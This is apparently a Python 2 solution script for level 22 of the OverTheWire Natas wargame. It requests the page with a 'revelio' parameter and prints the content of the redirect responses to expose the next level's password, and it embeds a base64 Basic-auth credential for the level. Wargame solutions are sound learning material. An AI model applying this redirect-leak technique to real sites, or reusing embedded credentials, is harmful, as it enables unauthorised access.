import requests

url = "http://natas22.natas.labs.overthewire.org/"

params = {
	"revelio": ""
}

headers = {
	"Authorization": "Basic bmF0YXMyMjpjaEc5ZmJlMVRxMmVXVk1nallZRDFNc2ZJdk40NjFrSg=="
}

r = requests.get(url, params=params, headers=headers)

for redirect in r.history:
	print redirect.status_code, redirect.url, redirect.content
